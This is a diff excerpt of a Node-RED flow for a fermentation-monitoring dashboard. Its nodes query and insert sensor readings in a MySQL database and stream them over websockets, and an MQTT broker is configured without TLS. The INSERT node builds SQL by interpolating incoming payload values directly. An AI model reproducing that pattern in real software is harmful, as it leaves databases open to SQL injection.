+        "func": "function formatDateToMySQL(date) {\n  const d = new Date(date);\n  const pad = (n) => (n < 10 ? '0' + n : n);\n  return d.getFullYear() + '-' +\n    pad(d.getMonth() + 1) + '-' +\n    pad(d.getDate()) + ' ' +\n    pad(d.getHours()) + ':' +\n    pad(d.getMinutes()) + ':' +\n    pad(d.getSeconds());\n}\n\nconst fechaMySQL = formatDateToMySQL(msg.payload.timestamp);\n\nmsg.topic = `\nINSERT INTO Sensor (Fecha_Control, Valor_Medido, Tipo_Sensor, ID_Registro) VALUES\n('${fechaMySQL}', ${msg.payload.valor}, 'temperaturaSonda', ${global.get(\"ID_Registro_Actual\")});\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 790,
+        "y": 1000,
+        "wires": [
+            [
+                "37bc8745a4f489eb"
+            ]
+        ]
+    },
+    {
+        "id": "72ccf46be2970f04",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Consultar Lecturas Sensor Humedad Ambiente",
+        "func": "// Obtener el ID_Registro actual desde la variable global\nconst idRegistroActual = global.get(\"ID_Registro_Actual\");\n\n// Verificamos que el ID esté definido\nif (!idRegistroActual) {\n    node.error(\"No se encontró la variable global ID_Registro_Actual.\");\n    return null;\n}\n\n// Construimos la consulta SQL para humedad\nmsg.topic = `\n    SELECT \n        Fecha_Control AS timestamp, \n        Valor_Medido AS valor \n    FROM Sensor \n    WHERE Tipo_Sensor = 'humedad' \n      AND ID_Registro = ${idRegistroActual}\n    ORDER BY Fecha_Control DESC\n    LIMIT 100;\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3140,
+        "y": 1020,
+        "wires": [
+            [
+                "3ce3515f11984364"
+            ]
+        ]
+    },
+    {
+        "id": "3ce3515f11984364",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3450,
+        "y": 1020,
+        "wires": [
+            [
+                "a5ea656df950c33e"
+            ]
+        ]
+    },
+    {
+        "id": "a5ea656df950c33e",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Armar JSON Humedad Ambiente",
+        "func": "// El resultado del nodo MySQL está en msg.payload como un array\nconst resultados = msg.payload;\n\n// Transformamos los datos en el formato que espera el frontend\nconst datosFormateados = resultados.map(r => ({\n    timestamp: r.timestamp,\n    valor: r.valor\n}));\n\n// Agregamos el tipo de sensor para que el frontend lo identifique\nmsg.payload = {\n    tipo: \"humedad\",\n    datos: datosFormateados\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3700,
+        "y": 1020,
+        "wires": [
+            [
+                "e73c3fb058551425"
+            ]
+        ]
+    },
+    {
+        "id": "e73c3fb058551425",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Enviar Datos Humedad Ambiente",
+        "server": "601e87cca96a98b7",
+        "client": "",
+        "x": 4080,
+        "y": 1020,
+        "wires": []
+    },
+    {
+        "id": "075b4fdedfbf804e",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Consultar Lecturas Sensor Calidad Aire",
+        "func": "// Obtener el ID_Registro actual desde la variable global\nconst idRegistroActual = global.get(\"ID_Registro_Actual\");\n\n// Verificamos que el ID esté definido\nif (!idRegistroActual) {\n    node.error(\"No se encontró la variable global ID_Registro_Actual.\");\n    return null;\n}\n\n// Construimos la consulta SQL para CO2\nmsg.topic = `\n    SELECT \n        Fecha_Control AS timestamp, \n        Valor_Medido AS valor \n    FROM Sensor \n    WHERE Tipo_Sensor = 'CO2' \n      AND ID_Registro = ${idRegistroActual}\n    ORDER BY Fecha_Control DESC\n    LIMIT 100;\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3120,
+        "y": 1080,
+        "wires": [
+            [
+                "73602fcb9b655d0a"
+            ]
+        ]
+    },
+    {
+        "id": "73602fcb9b655d0a",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3450,
+        "y": 1080,
+        "wires": [
+            [
+                "72e556e10dab3bd7"
+            ]
+        ]
+    },
+    {
+        "id": "72e556e10dab3bd7",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Armar JSON Calidad Aire",
+        "func": "// El resultado del nodo MySQL está en msg.payload como un array\nconst resultados = msg.payload;\n\n// Transformamos los datos en el formato que espera el frontend\nconst datosFormateados = resultados.map(r => ({\n    timestamp: r.timestamp,\n    valor: r.valor\n}));\n\n// Agregamos el tipo de sensor para que el frontend lo identifique\nmsg.payload = {\n    tipo: \"co2\",\n    datos: datosFormateados\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3670,
+        "y": 1080,
+        "wires": [
+            [
+                "0a53da4494bf0fef"
+            ]
+        ]
+    },
+    {
+        "id": "0a53da4494bf0fef",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Enviar Datos Calidad Aire",
+        "server": "5f9c08ff63cfddb2",
+        "client": "",
+        "x": 4050,
+        "y": 1080,
+        "wires": []
+    },
+    {
+        "id": "5e7f18b03beea055",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Consultar Lecturas Sensor Temperatura Sonda",
+        "func": "const idRegistroActual = global.get(\"ID_Registro_Actual\");\n\nif (!idRegistroActual) {\n    node.error(\"No se encontró la variable global ID_Registro_Actual.\");\n    return null;\n}\n\nmsg.topic = `\n  SELECT \n    Fecha_Control AS timestamp, \n    Valor_Medido AS valor \n  FROM Sensor \n  WHERE Tipo_Sensor = 'temperaturaSonda' \n    AND ID_Registro = ${idRegistroActual}\n  ORDER BY Fecha_Control DESC\n  LIMIT 100;\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3140,
+        "y": 1140,
+        "wires": [
+            [
+                "49ae108ea787ce8a"
+            ]
+        ]
+    },
+    {
+        "id": "49ae108ea787ce8a",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3450,
+        "y": 1140,
+        "wires": [
+            [
+                "f06c14eabde42bd4"
+            ]
+        ]
+    },
+    {
+        "id": "f06c14eabde42bd4",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Armar JSON Temperatura Sonda",
+        "func": "const resultados = msg.payload; // resultado SQL\n\nconst datosFormateados = resultados.map(r => ({\n    timestamp: r.timestamp,\n    valor: r.valor,\n}));\n\nmsg.payload = {\n    tipo: \"temperaturaSonda\",\n    datos: datosFormateados,\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3700,
+        "y": 1140,
+        "wires": [
+            [
+                "3f3f6feb99d66031"
+            ]
+        ]
+    },
+    {
+        "id": "3f3f6feb99d66031",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "0580de529f2ac7c9",
+        "name": "Enviar Datos Temperatura Sonda",
+        "server": "2a9a3bd91d5e664e",
+        "client": "",
+        "x": 4080,
+        "y": 1140,
+        "wires": []
+    },
+    {
+        "id": "c6ac5901ac8dbfef",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "g": "a75f0cd5305c1521",
+        "name": "Cronometro Consulta Variables",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "15",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 2750,
+        "y": 1420,
+        "wires": [
+            [
+                "0d9db733414cf42b"
+            ]
+        ]
+    },
+    {
+        "id": "0d9db733414cf42b",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "a75f0cd5305c1521",
+        "name": "Consultar Alarmas",
+        "func": "const idRegistroActual = global.get(\"ID_Registro_Actual\");\n\nif (!idRegistroActual) {\n    node.error(\"No se encontró la variable global ID_Registro_Actual.\");\n    return null;\n}\n\nmsg.topic = `\n  SELECT \n    ID_Alarma,\n    Tipo_Alarma,\n    Valor_Registrado,\n    Descripcion_Incidente,\n    Fecha_Activacion \n  FROM Alarma\n  WHERE ID_Registro = ${idRegistroActual}\n  ORDER BY Fecha_Activacion DESC\n`;\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3110,
+        "y": 1420,
+        "wires": [
+            [
+                "18a27b2f7217be72"
+            ]
+        ]
+    },
+    {
+        "id": "18a27b2f7217be72",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "a75f0cd5305c1521",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 3390,
+        "y": 1420,
+        "wires": [
+            [
+                "f70a6917eb2520f3"
+            ]
+        ]
+    },
+    {
+        "id": "f70a6917eb2520f3",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "a75f0cd5305c1521",
+        "name": "Armar JSON Alarmas",
+        "func": "const resultados = msg.payload;\n\nconst alarmasFormateadas = resultados.map(r => ({\n    id: r.ID_Alarma,\n    tipo: r.Tipo_Alarma,\n    valor: r.Valor_Registrado,\n    descripcion: r.Descripcion_Incidente,\n    fecha: r.Fecha_Activacion\n}));\n\nmsg.payload = {\n    tipo: \"alarmas\",\n    datos: alarmasFormateadas\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 3660,
+        "y": 1420,
+        "wires": [
+            [
+                "65d6ca06db27ed08"
+            ]
+        ]
+    },
+    {
+        "id": "65d6ca06db27ed08",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "a75f0cd5305c1521",
+        "name": "Enviar Datos Alarmas",
+        "server": "4ecfed954ff8b4e3",
+        "client": "",
+        "x": 4000,
+        "y": 1420,
+        "wires": []
+    },
+    {
+        "id": "7d88b79f7d832dc2",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Enviar Alarma Temperatura Ambiente",
+        "server": "3734f003521f9ed5",
+        "client": "",
+        "x": 1110,
+        "y": 340,
+        "wires": []
+    },
+    {
+        "id": "5d5c392d5c1674e7",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Enviar Alarma Humedad",
+        "server": "822e5af0f7e6807c",
+        "client": "",
+        "x": 1090,
+        "y": 540,
+        "wires": []
+    },
+    {
+        "id": "0a457a05c4bd470e",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Enviar Alarma Calidad Aire",
+        "server": "6fd653dc8fcbebeb",
+        "client": "",
+        "x": 1080,
+        "y": 740,
+        "wires": []
+    },
+    {
+        "id": "edd04596e686c165",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Enviar Alarma Temperatura Sonda",
+        "server": "8c11da29d14db2f1",
+        "client": "",
+        "x": 1180,
+        "y": 940,
+        "wires": []
+    },
+    {
+        "id": "156abb3d8c2199c6",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "g": "595316d8d88582bf",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "15",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 1530,
+        "y": 880,
+        "wires": [
+            [
+                "f98b9d203e1b9857"
+            ]
+        ]
+    },
+    {
+        "id": "f98b9d203e1b9857",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "595316d8d88582bf",
+        "name": "Armar Consulta para traer ultimo ID Registro",
+        "func": "msg.topic = \"SELECT ID_Registro FROM Registro_Actividad ORDER BY ID_Registro DESC LIMIT 1;\";\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1850,
+        "y": 880,
+        "wires": [
+            [
+                "fb8b824dee1a44c5"
+            ]
+        ]
+    },
+    {
+        "id": "fb8b824dee1a44c5",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "595316d8d88582bf",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 2130,
+        "y": 880,
+        "wires": [
+            [
+                "f26c72bc4a8a9233"
+            ]
+        ]
+    },
+    {
+        "id": "f26c72bc4a8a9233",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "595316d8d88582bf",
+        "name": "Setear Ultimo ID Registro",
+        "func": "// Verificamos que haya resultados\nif (!msg.payload || !Array.isArray(msg.payload) || msg.payload.length === 0) {\n    node.error(\"No se encontró ningún resultado en msg.payload\");\n    return null;\n}\n\n// Extraemos el último ID_Registro\nlet ultimoId = msg.payload[0].ID_Registro;\n\n// Lo asignamos al contexto global\nglobal.set(\"ID_Registro_Actual\", ultimoId);\n\n// Opcional: enviamos el ID como mensaje para debug o seguimiento\nmsg.ID_Registro_Actual = ultimoId;\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 2370,
+        "y": 880,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "8b07e5f9a4e4a648",
+        "type": "MySQLdatabase",
+        "name": "DB",
+        "host": "matucesari.servehttp.com",
+        "port": "3306",
+        "db": "micesari",
+        "tz": "",
+        "charset": "UTF8"
+    },
+    {
+        "id": "c33d24eeb07e1b55",
+        "type": "websocket-listener",
+        "path": "/ws/fermentacion",
+        "wholemsg": "false"
+    },
+    {
+        "id": "e9302dc59ed18e5d",
+        "type": "mqtt-broker",
+        "name": "MiBroker",
+        "broker": "matucesari.servehttp.com",
+        "port": "1883",
+        "clientid": "",
+        "autoConnect": true,
+        "usetls": false,
+        "protocolVersion": "4",
+        "keepalive": "60",
+        "cleansession": true,
+        "autoUnsubscribe": true,
+        "birthTopic": "",
+        "birthQos": "0",
+        "birthRetain": "false",
+        "birthPayload": "",
+        "birthMsg": {},
+        "closeTopic": "",
+        "closeQos": "0",
+        "closeRetain": "false",
+        "closePayload": "",
+        "closeMsg": {},
+        "willTopic": "",
+        "willQos": "0",
+        "willRetain": "false",
+        "willPayload": "",
+        "willMsg": {},
+        "userProps": "",
+        "sessionExpiry": ""
+    },
+    {
+        "id": "cf29aa31a0ead7a7",
+        "type": "websocket-listener",
+        "path": "/ws/temp",
+        "wholemsg": "false"
+    },
+    {
+        "id": "dc57c47d1bc1b1f6",
+        "type": "websocket-listener",
+        "path": "/ws/humedad",
+        "wholemsg": "false"
+    },
+    {
+        "id": "74a384dee911fb0b",
+        "type": "websocket-listener",
+        "path": "/ws/calidadAire",
+        "wholemsg": "false"
+    },
+    {
+        "id": "e01c47bef6eaf7e7",
+        "type": "websocket-listener",
+        "path": "/ws/tempSonda",
+        "wholemsg": "false"
+    },
+    {
+        "id": "5942395036d16521",
+        "type": "websocket-listener",
+        "path": "/ws/ventilador1",
+        "wholemsg": "false"
+    },
+    {
+        "id": "b17c2d5db60310be",
+        "type": "websocket-listener",
+        "path": "/ws/ventilador2",
+        "wholemsg": "false"
+    },
+    {
+        "id": "e6b2e1324cf1c43b",
+        "type": "websocket-listener",
+        "path": "/ws/aire-frio",
+        "wholemsg": "false"
+    },
+    {
+        "id": "2bbc54d0a8edb50e",
+        "type": "websocket-listener",
+        "path": "/ws/calefaccion",
+        "wholemsg": "false"
+    },
+    {
+        "id": "b063a8baa9bbaf13",
+        "type": "websocket-listener",
+        "path": "/ws/humidificador",
+        "wholemsg": "false"
+    },
+    {
+        "id": "866a2a2bcefaf27b",
+        "type": "ui_group",
+        "d": true,
+        "name": "ESP32 CAM",
+        "tab": "04c1c5b042c8e379",
+        "order": 8,
+        "disp": true,
+        "width": "20",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "961298ba6ab6e1d0",
+        "type": "websocket-listener",
+        "path": "params/tempAmbiente",
+        "wholemsg": "false"
+    },
+    {
+        "id": "3beea0692773a3b6",
+        "type": "websocket-listener",
+        "path": "/params/humedad",
+        "wholemsg": "false"
+    },
+    {
+        "id": "1b77a9c030956226",
+        "type": "websocket-listener",
+        "path": "/params/calidadAire",
+        "wholemsg": "false"
+    },
+    {
+        "id": "e03c10eb526d0e5b",
+        "type": "websocket-listener",
+        "path": "/params/tempSonda",
+        "wholemsg": "false"
+    },
+    {
+        "id": "ebc6f4821fb62a22",
+        "type": "websocket-listener",
+        "path": "/ws/sensor/historialTemperaturaAmbiente",
+        "wholemsg": "false"
+    },
+    {
+        "id": "601e87cca96a98b7",
+        "type": "websocket-listener",
+        "path": "/ws/sensor/historialHumedadAmbiente",
+        "wholemsg": "false"
+    },
+    {
+        "id": "5f9c08ff63cfddb2",
+        "type": "websocket-listener",
+        "path": "/ws/sensor/historialCalidadAire",
+        "wholemsg": "false"
+    },
+    {
+        "id": "2a9a3bd91d5e664e",
+        "type": "websocket-listener",
+        "path": "/ws/sensor/historialTemperaturaSonda",
+        "wholemsg": "false"
+    },
+    {
+        "id": "4ecfed954ff8b4e3",
+        "type": "websocket-listener",
+        "path": "/ws/alarmas",
+        "wholemsg": "false"
+    },
+    {
+        "id": "3734f003521f9ed5",
+        "type": "websocket-listener",
+        "path": "/ws/AlarmaTemperaturaAmbiente",
+        "wholemsg": "false"
+    },
+    {
+        "id": "822e5af0f7e6807c",
+        "type": "websocket-listener",
+        "path": "/ws/AlarmaHumedad",
+        "wholemsg": "false"
+    },
+    {
+        "id": "6fd653dc8fcbebeb",
+        "type": "websocket-listener",
+        "path": "/ws/AlarmaCalidadAire",
+        "wholemsg": "false"
+    },
+    {
+        "id": "8c11da29d14db2f1",
+        "type": "websocket-listener",
+        "path": "/ws/AlarmaTemperaturaSonda",
+        "wholemsg": "false"
+    },
+    {
+        "id": "04c1c5b042c8e379",
+        "type": "ui_tab",
+        "name": "Sistema UMAMI",
+        "icon": "dashboard",
+        "order": 3,
+        "disabled": false,
+        "hidden": false
+    }
+]
